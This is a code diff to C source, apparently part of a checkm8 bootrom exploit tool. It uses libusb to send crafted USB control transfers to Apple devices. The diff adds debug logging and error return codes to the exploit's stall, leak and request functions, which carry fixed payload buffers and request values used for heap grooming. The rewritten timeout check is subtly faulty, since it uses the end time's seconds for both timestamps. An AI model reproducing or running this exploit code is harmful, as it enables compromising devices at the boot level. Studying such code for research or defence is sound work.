@@ -9,8 +9,10 @@
 
 int get_device_bundle(struct pwned_device *dev)
 {
+    checkm8_debug("get_device_bundle(dev = %p)\n", dev);
     if(dev->bundle->ctx == NULL)
     {
+        checkm8_debug("bundle ctx is NULL, allocating\n");
         dev->bundle->ctx = malloc(sizeof(libusb_context));
         libusb_init(&dev->bundle->ctx);
     }
@@ -20,6 +22,7 @@ int get_device_bundle(struct pwned_device *dev)
            dev->bundle->descriptor->idVendor == dev->idVendor &&
            dev->bundle->descriptor->idProduct == dev->idProduct)
         {
+            checkm8_debug("bundle is already valid\n");
             return LIBUSB_SUCCESS;
         }
     }
@@ -28,6 +31,7 @@ int get_device_bundle(struct pwned_device *dev)
     int usb_dev_count, ret = LIBUSB_ERROR_NO_DEVICE;
 
     usb_dev_count = libusb_get_device_list(dev->bundle->ctx, &usb_device_list);
+    checkm8_debug("found %i USB devices\n", usb_dev_count);
 
     dev->bundle->device = NULL;
     dev->bundle->handle = NULL;
@@ -41,19 +45,24 @@ int get_device_bundle(struct pwned_device *dev)
         if(dev->bundle->descriptor->idVendor == dev->idVendor &&
            dev->bundle->descriptor->idProduct == dev->idProduct)
         {
+            checkm8_debug("checking device %i ... match!\n", i);
             ret = LIBUSB_SUCCESS;
             break;
         }
+
+        checkm8_debug("checking device %i ... no match\n", i);
     }
 
     libusb_free_device_list(usb_device_list, usb_dev_count);
     if(ret == LIBUSB_SUCCESS)
     {
+        checkm8_debug("opening device and returning success\n");
         libusb_open(dev->bundle->device, &dev->bundle->handle);
         libusb_set_auto_detach_kernel_driver(dev->bundle->handle, 1);
     }
     else
     {
+        checkm8_debug("could not find a matching device\n");
         libusb_exit(dev->bundle->ctx);
         free(dev->bundle->ctx);
         free(dev->bundle->descriptor);
@@ -69,21 +78,27 @@ int get_device_bundle(struct pwned_device *dev)
 
 int release_device_bundle(struct pwned_device *dev)
 {
+    checkm8_debug("release_device_bundle(dev = %p)\n", dev);
     if(dev->bundle->handle != NULL)
     {
+        checkm8_debug("closing handle\n");
         libusb_close(dev->bundle->handle);
+        dev->bundle->handle = NULL;
     }
 
     dev->bundle->device = NULL;
 
     if(dev->bundle->ctx != NULL)
     {
+        checkm8_debug("exiting context\n");;
         libusb_exit(dev->bundle->ctx);
         free(dev->bundle->ctx);
+        dev->bundle->ctx = NULL;
     }
 
     if(dev->bundle->descriptor != NULL)
     {
+        checkm8_debug("freeing device descriptor\n");
         free(dev->bundle->descriptor);
         dev->bundle->descriptor = NULL;
     }
@@ -91,20 +106,29 @@ int release_device_bundle(struct pwned_device *dev)
     return LIBUSB_SUCCESS;
 }
 
-void LIBUSB_CALL async_ctrl_transfer_cb(struct libusb_transfer *transfer)
+int is_device_bundle_open(struct pwned_device *dev)
 {
-    printf("transfer status: %s (%i / %i)\n",
-           libusb_error_name(transfer->status),
-           transfer->actual_length,
-           transfer->length);
+    return dev->bundle->ctx != NULL && dev->bundle->device != NULL &&
+           dev->bundle->handle != NULL && dev->bundle->descriptor != NULL;
 }
 
-void libusb1_async_ctrl_transfer(struct pwned_device *dev,
-                                 unsigned char bmRequestType, unsigned char bRequest,
-                                 unsigned short wValue, unsigned short wIndex,
-                                 unsigned char *data, unsigned short data_len,
-                                 unsigned int timeout)
+void LIBUSB_CALL async_ctrl_transfer_cb(struct libusb_transfer *transfer)
 {
+    checkm8_debug("transfer status: %s (%i / %i)\n",
+                  libusb_error_name(transfer->status),
+                  transfer->actual_length,
+                  transfer->length);
+}
+
+int libusb1_async_ctrl_transfer(struct pwned_device *dev,
+                                unsigned char bmRequestType, unsigned char bRequest,
+                                unsigned short wValue, unsigned short wIndex,
+                                unsigned char *data, unsigned short data_len,
+                                unsigned int timeout)
+{
+    checkm8_debug(
+            "async_ctrl_transfer(dev = %p, bmRequestType = %i, bRequest = %i, wValue = %i, wIndex = %i, data = %p, data_len = %i, timeout = %i)\n",
+            dev, bmRequestType, bRequest, wValue, wIndex, data, data_len, timeout);
     struct timeval start, end;
     unsigned char usb_transfer_buf[8 + data_len];
     int ret;
@@ -116,38 +140,41 @@ void libusb1_async_ctrl_transfer(struct pwned_device *dev,
     memcpy(&usb_transfer_buf[8], data, data_len);
     libusb_fill_control_transfer(usb_transfer, dev->bundle->handle, usb_transfer_buf, async_ctrl_transfer_cb, NULL, 1);
 
+    checkm8_debug("submiting urb\n");
     ret = libusb_submit_transfer(usb_transfer);
     if(ret != 0)
     {
-        printf("Failed to submit async USB transfer: %s\n", libusb_error_name(ret));
+        checkm8_debug("failed to submit async USB transfer: %s\n", libusb_error_name(ret));
         libusb_free_transfer(usb_transfer);
-        exit(ret);
+        return CHECKM8_FAIL_XFER;
     }
 
     while(1)
     {
         gettimeofday(&end, NULL);
-        if(end.tv_usec - start.tv_usec > timeout)
+        if((1000000 * end.tv_sec + end.tv_usec) - (1000000 * end.tv_sec + start.tv_usec) > timeout)
         {
             ret = libusb_cancel_transfer(usb_transfer);
             if(ret != 0)
             {
-                printf("Failed to cancel async USB transfer: %s\n", libusb_error_name(ret));
-                exit(ret);
+                checkm8_debug("failed to cancel async USB transfer: %s\n", libusb_error_name(ret));
+                return CHECKM8_FAIL_XFER;
             }
-            return;
-        }
 
-        printf("%i / %i\n", usb_transfer->actual_length, usb_transfer->length);
+            return CHECKM8_SUCCESS;
+        }
     }
 }
 
-void libusb1_no_error_ctrl_transfer(struct pwned_device *dev,
-                                    unsigned char bmRequestType, unsigned char bRequest,
-                                    unsigned short wValue, unsigned short wIndex,
-                                    unsigned char *data, unsigned short data_len,
-                                    unsigned int timeout)
+int libusb1_no_error_ctrl_transfer(struct pwned_device *dev,
+                                   unsigned char bmRequestType, unsigned char bRequest,
+                                   unsigned short wValue, unsigned short wIndex,
+                                   unsigned char *data, unsigned short data_len,
+                                   unsigned int timeout)
 {
+    checkm8_debug(
+            "no_error_ctrl_transfer(dev = %p, bmRequestType = %i, bRequest = %i, wValue = %i, wIndex = %i, data = %p, data_len = %i, timeout = %i)\n",
+            dev, bmRequestType, bRequest, wValue, wIndex, data, data_len, timeout);
     int ret;
     unsigned char recipient = bmRequestType & 3u;
     unsigned char rqtype = bmRequestType & (3u << 5u);
@@ -157,13 +184,15 @@ void libusb1_no_error_ctrl_transfer(struct pwned_device *dev,
         ret = libusb_claim_interface(dev->bundle->handle, interface);
         if(ret > 0)
         {
-            printf("%s\n", libusb_error_name(ret));
-            exit(1);
+            checkm8_debug("failed to claim interface: %s\n", libusb_error_name(ret));
+            return CHECKM8_FAIL_XFER;
         }
     }
 
-    ret = libusb_control_transfer(dev->bundle->handle, bmRequestType, bRequest, wValue, wIndex, data, data_len, timeout);
-    printf("%s\n", libusb_error_name(ret));
+    ret = libusb_control_transfer(dev->bundle->handle, bmRequestType, bRequest, wValue, wIndex, data, data_len,
+                                  timeout);
+    checkm8_debug("got error %s but ignoring\n", libusb_error_name(ret));
+    return CHECKM8_SUCCESS;
 }
 
 static unsigned char data_0xA_0xC0_buf[192] =
@@ -232,39 +261,38 @@ static unsigned char data_0x0_0xC0_buf[192] =
                 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0
         };
 
-void stall(struct pwned_device *dev)
+int stall(struct pwned_device *dev)
 {
-    libusb1_async_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A,
-                                data_0xA_0xC0_buf, 0xC0, 1);
+    return libusb1_async_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A, data_0xA_0xC0_buf, 0xC0, 15);
 }
 
-void leak(struct pwned_device *dev)
+int leak(struct pwned_device *dev)
 {
-    libusb1_no_error_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A,
-                                   data_0x0_0xC0_buf, 0xC0, 1);
+    libusb1_no_error_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A, data_0x0_0xC0_buf, 0xC0, 1);
+    return CHECKM8_SUCCESS;
 }
 
-void no_leak(struct pwned_device *dev)
+int no_leak(struct pwned_device *dev)
 {
-    libusb1_no_error_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A,
-                                   data_0xA_0xC1_buf, 0xC1, 1);
+    libusb1_no_error_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A, data_0xA_0xC1_buf, 0xC1, 1);
+    return CHECKM8_SUCCESS;
 }
 
-void usb_req_stall(struct pwned_device *dev)
+int usb_req_stall(struct pwned_device *dev)
 {
     unsigned char data[0];
-    libusb1_no_error_ctrl_transfer(dev, 0x2, 3, 0, 0x80, data, 0, 1);
+    libusb1_no_error_ctrl_transfer(dev, 0x2, 3, 0, 0x80, data, 0, 10);
+    return CHECKM8_SUCCESS;
 }
 
-void usb_req_leak(struct pwned_device *dev)
+int usb_req_leak(struct pwned_device *dev)
 {
-    libusb1_no_error_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A,
-                                   data_0x0_0x40_buf, 0x40, 1);
+    libusb1_no_error_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A, data_0x0_0x40_buf, 0x40, 1);
+    return CHECKM8_SUCCESS;
 }
 
-void usb_req_no_leak(struct pwned_device *dev)
+int usb_req_no_leak(struct pwned_device *dev)
 {
-
-    libusb1_no_error_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A,
-                                   data_0x0_0x41_buf, 0x41, 1);
+    libusb1_no_error_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A, data_0x0_0x41_buf, 0x41, 1);
+    return CHECKM8_SUCCESS;
 }
